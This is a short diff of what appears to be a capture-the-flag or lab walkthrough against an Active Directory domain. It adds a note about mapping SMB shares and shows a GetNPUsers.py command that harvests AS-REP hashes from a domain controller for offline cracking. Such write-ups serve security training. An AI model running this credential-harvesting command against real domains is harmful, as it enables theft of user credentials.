@@ -213,7 +213,7 @@ LocalizedResourceName=@%SystemRoot%\system32\shell32.dll,-21813
 
 ntuser.ini in the ytbob317 reads as \ufffd\ufffd
 
-
+NOTE: Here I could install smbmap on the attack box and view recursively but I have more options until I have to dive down the rabbit hole of fully mapping the shares.
 
 root@ip-10-201-48-39:~# GetNPUsers.py SOUPEDECODE.LOCAL/ -dc-ip 10.201.9.75 -usersfile users.txt -format hashcat -outputfile hashes.txt
 
